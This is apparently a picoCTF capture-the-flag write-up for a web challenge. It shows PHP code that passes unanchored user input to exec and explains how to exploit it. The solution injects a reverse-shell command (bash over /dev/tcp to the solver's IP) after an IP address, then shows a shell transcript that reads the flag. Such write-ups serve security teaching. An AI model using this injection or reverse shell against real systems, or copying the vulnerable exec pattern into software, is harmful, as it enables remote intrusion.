# fancy-alive-monitoring
Web Exploitation, 400 points

## Description:
> One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell3.picoctf.com:8587 (link)? 

```php
<html>
<head>
	<title>Monitoring Tool</title>
	<script>
	function check(){
		ip = document.getElementById("ip").value;
		chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
		if (!chk) {
			alert("Wrong IP format.");
			return false;
		} else {
			document.getElementById("monitor").submit();
		}
	}
	</script>
</head>
<body>
	<h1>Monitoring Tool ver 0.1</h1>
	<form id="monitor" action="index.php" method="post" onsubmit="return false;">
	<p> Input IP address of the target host
	<input id="ip" name="ip" type="text">
	</p>
	<input type="button" value="Go!" onclick="check()">
	</form>
	<hr>

<?php
$ip = $_POST["ip"];
if ($ip) {
	// super fancy regex check!
	if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
		exec('ping -c 1 '.$ip, $cmd_result);
		foreach($cmd_result as $str){
			if (strpos($str, '100% packet loss') !== false){
				printf("<h3>Target is NOT alive.</h3>");
				break;
			} else if (strpos($str, ', 0% packet loss') !== false){
				printf("<h3>Target is alive.</h3>");
				break;
			}
		}
	} else {
		echo "Wrong IP Format.";
	}
}
?>
<hr>
<a href="index.txt">index.php source code</a>
</body>
</html>

```

## Solution:

The form expects an IP, but it actually allows us to send any command after the IP and it will be executed by `exec`.
We will use this to open a reverse shell.

### Step 1: Check your internal IP:
```
C:\Users\User>ipconfig

Windows IP Configuration

Wireless LAN adapter Wi-Fi:

   Connection-specific DNS Suffix  . : home
   Link-local IPv6 Address . . . . . : ******
   IPv4 Address. . . . . . . . . . . : 10.0.0.7
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.138
```

The internal IP in this example is 10.0.0.7.

### Step 2: Check your external IP:

This can be done by visiting [What is my IP?](https://www.whatismyip.com/).

```
Your Public IPv4 is: 87.71.89.17
Your IPv6 is: Not Detected
Your Local IP is: 10.0.0.7
```

The external IP in this example is 87.71.89.17.

### Step 3: Select a port number
We'll choose "4444".

### Step 4: Connect to your router and set up port forwarding:

The exact steps may vary depending on router:

```
Advanced -> Virtual Server -> Port Forwarding

Create the port forwarding rules to allow certain applications or server software to work on your computers if the Internet connection uses NAT.

Application Name 	External Packet 	Internal Host 	Delete
IP Address 	Protocol 	Port 	IP Address 	Port
test 	ALL 	TCP 	4444 	10.0.0.7 	4444 	
```

### Step 5: Setup netcat to listen on local server:

For example, using WSL:

```
user@computer:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

### Step 6: Execute attack:

We submit the following IP:
```
127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/87.71.89.17/4444 0>&1'
```

Everything after `127.0.0.1;` is related to the reverse shell.

### Step 7: Reverse shell connects:
```
user@computer:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [18.224.26.75] port 4444 [tcp/*] accepted (family 2, sport 47032)
bash: cannot set terminal process group (7379): Inappropriate ioctl for device
bash: no job control in this shell
<ive-monitoring_1_14d0233714148d826b8d5f6bc1a8d624$ ls
ls
flag.txt
index.php
index.txt
xinet_startup.sh
<ive-monitoring_1_14d0233714148d826b8d5f6bc1a8d624$ cat flag.txt
cat flag.txt
Here is your flag: picoCTF{n3v3r_trust_a_b0x_96639d91}
<ive-monitoring_1_14d0233714148d826b8d5f6bc1a8d624$ exit
exit
exit
```

### Step 8: Delete port forwarding

Connect to your router and delete the port forwarding.

---

The flag: picoCTF{n3v3r_trust_a_b0x_96639d91}